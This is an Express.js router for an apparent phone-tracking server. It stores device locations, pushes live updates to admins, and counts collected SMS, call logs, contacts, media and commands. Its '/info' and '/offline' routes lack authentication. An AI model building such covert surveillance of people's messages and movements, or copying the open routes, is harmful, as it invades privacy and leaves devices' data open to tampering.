const express = require('express');
const fetch = require('node-fetch');
const { Op } = require('sequelize');
const { Device, Location, MediaFile, Contact, SMS, CallLog, DeviceInfo, Command } = require('../config/database');
const { authenticateToken, authenticateDevice, requireAdmin } = require('../middleware/auth');
const logger = require('../utils/logger');

const router = express.Router();

const logRequest = (req, res, next) => {
  const requestId = req.requestId || 'unknown';
  logger.info(`[${requestId}] Devices API: ${req.method} ${req.originalUrl}`);
  if (Object.keys(req.body || {}).length > 0) {
    logger.debug(`[${requestId}] Request body:`, JSON.stringify(req.body, null, 2));
  }
  next();
};

router.use([
  express.json({ limit: '10mb' }),
  express.urlencoded({ extended: true, limit: '10mb' }),
  logRequest
]);

function normalizeDevice(plain) {
  const devicePlain = plain || {};
  return {
    id: devicePlain.id,
    deviceId: devicePlain.deviceId || devicePlain.device_id || null,
    name: devicePlain.name || devicePlain.device_name || null,
    nickname: devicePlain.nickname || null,
    status: devicePlain.status || (devicePlain.isOnline ? 'online' : 'offline'),
    lastSeen: devicePlain.lastSeen || devicePlain.last_seen || null,
    device_id: devicePlain.device_id || devicePlain.deviceId || null,
    device_name: devicePlain.device_name || devicePlain.name || null,
    last_seen: devicePlain.last_seen || devicePlain.lastSeen || null,
    ...devicePlain
  };
}

// reverseGeocode function unchanged (copy from your file)
async function reverseGeocode(lat, lng) {
  try {
    const provider = (process.env.GEOCODE_PROVIDER || 'nominatim').toLowerCase();
    if (provider === 'google' && process.env.GEOCODE_API_KEY) {
      const key = process.env.GEOCODE_API_KEY;
      const url = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=${key}`;
      const resp = await fetch(url);
      const data = await resp.json();
      if (data.status === 'OK' && Array.isArray(data.results) && data.results.length > 0) {
        return data.results[0].formatted_address;
      }
      return null;
    } else {
      const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}&addressdetails=0`;
      const resp = await fetch(url, {
        headers: { 'User-Agent': process.env.REVERSE_GEOCODE_AGENT || 'HawkshawServer/1.0 (your-email@example.com)' },
        timeout: 8000
      });
      if (!resp.ok) return null;
      const data = await resp.json();
      return data.display_name || null;
    }
  } catch (err) {
    logger.warn('Reverse geocode failed:', err && err.message ? err.message : err);
    return null;
  }
}

// GET /api/devices (Admin)
router.get('/', authenticateToken, requireAdmin, async (req, res) => {
  const requestId = req.requestId || 'unknown';
  try {
    logger.info(`[${requestId}] Fetching devices list`);
    const { page = 1, limit = 20, status, search } = req.query;
    const offset = (page - 1) * limit;

    logger.info(`[${requestId}] Fetching devices - Page: ${page}, Limit: ${limit}, Status: ${status || 'all'}, Search: ${search || 'none'}`);

    const whereClause = {};
    if (status) whereClause.status = status;
    if (search) {
      whereClause[Op.or] = [
        { device_name: { [Op.like]: `%${search}%` } },
        { device_id: { [Op.like]: `%${search}%` } },
        { model: { [Op.like]: `%${search}%` } },
        { manufacturer: { [Op.like]: `%${search}%` } }
      ];
    }

    try {
      await Device.sequelize.authenticate();
    } catch (dbErr) {
      logger.error(`[${requestId}] DB connect error`, dbErr);
      return res.status(500).json({ success: false, error: 'Database connection error' });
    }

    const result = await Device.findAndCountAll({
      where: whereClause,
      limit: parseInt(limit, 10),
      offset: parseInt(offset, 10),
      order: [['lastSeen', 'DESC']],
      include: [{ model: DeviceInfo, as: 'deviceInfo', required: false }]
    });

    const count = result.count || 0;
    const devices = (result.rows || []).map(d => normalizeDevice(d.get ? d.get({ plain: true }) : d));
    res.json({
      success: true,
      data: devices,
      pagination: {
        current_page: parseInt(page, 10),
        total_pages: Math.ceil(count / limit),
        total_items: count
      }
    });
  } catch (error) {
    logger.error(`[${requestId}] Error fetching devices:`, error);
    res.status(500).json({ success: false, error: 'Internal server error', message: error.message });
  }
});

// GET /api/devices/:deviceId (Admin)
router.get('/:deviceId', authenticateToken, requireAdmin, async (req, res) => {
  const requestId = req.requestId || 'unknown';
  try {
    // Try find by PK first, then fallback to deviceId property
    let device = await Device.findByPk(req.params.deviceId, {
      include: [
        { model: DeviceInfo, as: 'deviceInfo', required: false },
        { model: Location, as: 'locations', limit: 10, order: [['timestamp', 'DESC']], required: false },
        { model: Command, as: 'commands', limit: 20, order: [['created_at', 'DESC']], required: false }
      ]
    });

    if (!device) {
      device = await Device.findOne({
        where: { deviceId: req.params.deviceId },
        include: [
          { model: DeviceInfo, as: 'deviceInfo', required: false },
          { model: Location, as: 'locations', limit: 10, order: [['timestamp', 'DESC']], required: false },
          { model: Command, as: 'commands', limit: 20, order: [['created_at', 'DESC']], required: false }
        ]
      });
    }

    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

    const devicePlain = device.get ? device.get({ plain: true }) : device;
    res.json({ success: true, data: normalizeDevice(devicePlain) });
  } catch (error) {
    logger.error(`[${requestId}] Error fetching device:`, error);
    res.status(500).json({ success: false, error: 'Failed to fetch device', message: error.message });
  }
});

// POST /api/devices/location (device -> server)
router.post('/location', authenticateDevice, async (req, res) => {
  const requestId = req.requestId || 'unknown';
  try {
    const deviceId = req.body.deviceId || req.body.device_id || req.deviceId || (req.device && req.device.deviceId) || null;
    if (!deviceId) return res.status(400).json({ success: false, error: 'Device ID is required' });

    const { latitude, longitude, altitude, accuracy, speed, bearing, provider, address, battery_level, network_type, is_mock } = req.body;

    if (latitude === undefined || longitude === undefined) {
      return res.status(400).json({ success: false, error: 'Latitude & longitude are required' });
    }

    let resolvedAddress = address || null;
    if (!resolvedAddress) {
      try {
        const addr = await reverseGeocode(latitude, longitude);
        if (addr) resolvedAddress = addr;
      } catch (err) {
        logger.warn(`[${requestId}] Reverse geocode failed:`, err && err.message ? err.message : err);
      }
    }

    const location = await Location.create({
      deviceId,
      latitude,
      longitude,
      altitude,
      accuracy,
      speed,
      bearing,
      provider,
      address: resolvedAddress,
      timestamp: new Date(),
      battery_level,
      network_type,
      is_mock: is_mock ? !!is_mock : false
    });

    // update device lastSeen + status + isOnline
    try {
      const device = await Device.findOne({ where: { deviceId } });
      if (device) {
        await device.update({ lastSeen: new Date(), status: 'online', isOnline: true });
      }
    } catch (err) {
      logger.warn(`[${requestId}] Could not update device lastSeen:`, err);
    }

    // emit
    if (req.io) {
      try {
        req.io.to('admin-room').emit('location-update', {
          deviceId, latitude, longitude, address: resolvedAddress, timestamp: location.timestamp || location.createdAt || new Date()
        });
      } catch (emitErr) {
        logger.warn(`[${requestId}] Emit failed for location-update:`, emitErr);
      }
    }

    res.json({ success: true, message: 'Location saved', data: location });
  } catch (error) {
    logger.error(`[${requestId}] Location save error:`, error);
    res.status(500).json({ success: false, error: 'Server error', message: error.message });
  }
});

// ALIAS: GET device location history (supports both ...)
router.get(['/:deviceId/locations', '/:deviceId/location/history'], authenticateToken, requireAdmin, async (req, res) => {
  const requestId = req.requestId || 'unknown';
  try {
    // find device by PK or by deviceId field
    let device = await Device.findByPk(req.params.deviceId);
    if (!device) device = await Device.findOne({ where: { deviceId: req.params.deviceId } });
    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

    const { limit = 500, since } = req.query;
    const where = { deviceId: device.deviceId };
    if (since) where.timestamp = { [Op.gte]: new Date(since) };

    const locations = await Location.findAll({
      where,
      order: [['timestamp', 'DESC']],
      limit: parseInt(limit, 10)
    });

      res.json({ success: true, data: locations });

    } catch (error) {
      logger.error(`[${requestId}] Location history error:`, error);
      res.status(500).json({ success: false, error: error.message });
    }
  }
);

// Update nickname
router.put('/:deviceId/nickname', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const { nickname } = req.body;
    if (nickname !== undefined && typeof nickname !== 'string') return res.status(400).json({ success: false, error: 'Nickname must be a string' });

    const device = await Device.findByPk(req.params.deviceId);
    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

    await device.update({ nickname: nickname || null });
    logger.info(`Device nickname updated by admin: ${device.deviceId || device.device_id}`);

    const devicePlain = device.get ? device.get({ plain: true }) : device;
    res.json({ success: true, message: 'Device nickname updated successfully', data: { device: normalizeDevice(devicePlain) } });
  } catch (error) {
    logger.error('Update device nickname error:', error);
    res.status(500).json({ success: false, error: 'Server error', message: error.message });
  }
});

// Delete device (Admin)
router.delete('/:deviceId', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const device = await Device.findByPk(req.params.deviceId);
    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

    await device.destroy();
    logger.info(`Device deleted by admin: ${device.deviceId || device.device_id}`);

    res.json({ success: true, message: 'Device deleted successfully' });
  } catch (error) {
    logger.error('Delete device error:', error);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// Device stats endpoint
router.get('/:deviceId/stats', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const device = await Device.findByPk(req.params.deviceId);
    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

    const [
      locationCount,
      mediaCount,
      contactCount,
      smsCount,
      callLogCount,
      commandCount
    ] = await Promise.all([
      Location.count({ where: { deviceId: device.deviceId } }),
      MediaFile.count({ where: { device_id: device.id } }),
      Contact.count({ where: { device_id: device.id } }),
      SMS.count({ where: { device_id: device.id } }),
      CallLog.count({ where: { device_id: device.id } }),
      Command.count({ where: { device_id: device.id } })
    ]);

    const recentActivity = await Location.findAll({ where: { deviceId: device.deviceId }, limit: 5, order: [['timestamp', 'DESC']] });

    res.json({
      success: true,
      data: {
        statistics: {
          locations: locationCount,
          media_files: mediaCount,
          contacts: contactCount,
          sms_messages: smsCount,
          call_logs: callLogCount,
          commands: commandCount
        },
        recent_activity: recentActivity
      }
    });
  } catch (error) {
    logger.error('Get device stats error:', error);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// Device info update (from device)
router.post('/info', async (req, res) => {
  try {
    const deviceIdHeader = req.body.device_id || req.body.deviceId || req.headers['x-device-id'];
    const device = await Device.findOne({ where: { deviceId: deviceIdHeader } });
    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

    const {
      hardware_info,
      software_info,
      network_info,
      security_info,
      installed_apps,
      system_settings,
      permissions,
      sensors
    } = req.body;

    let deviceInfo = await DeviceInfo.findOne({ where: { device_id: device.id } });

    if (deviceInfo) {
      await deviceInfo.update({
        hardware_info, software_info, network_info, security_info,
        installed_apps, system_settings, permissions, sensors, last_updated: new Date()
      });
    } else {
      deviceInfo = await DeviceInfo.create({
        device_id: device.id, hardware_info, software_info, network_info, security_info,
        installed_apps, system_settings, permissions, sensors
      });
    }

    logger.info(`Device info updated: ${deviceIdHeader}`);

    const devicePlain = device.get ? device.get({ plain: true }) : device;
    const emitted = { device_id: devicePlain.device_id || devicePlain.deviceId, deviceId: devicePlain.deviceId || devicePlain.device_id, info: deviceInfo.get ? deviceInfo.get({ plain: true }) : deviceInfo };

    if (req.io) {
      try { req.io.to('admin-room').emit('device-info-updated', emitted); } catch (emitErr) { logger.warn('Emit failed for device-info-updated', emitErr); }
    }

    res.json({ success: true, message: 'Device info updated successfully' });
  } catch (error) {
    logger.error('Update device info error:', error);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// Set device offline (from device)
router.post('/offline', async (req, res) => {
  try {
    const deviceId =
      req.body.deviceId ||
      req.body.device_id ||
      req.headers['x-device-id'];

    if (!deviceId) {
      return res.status(400).json({ success: false, error: 'Missing deviceId' });
    }

    await Device.update({
      isOnline: false,
      status: 'offline',
      lastSeen: new Date()
    }, { where: { deviceId } });

    res.json({ success: true });

  } catch (error) {
    logger.error('Offline update error:', error);
    res.status(500).json({ success: false });
  }
});

module.exports = router;
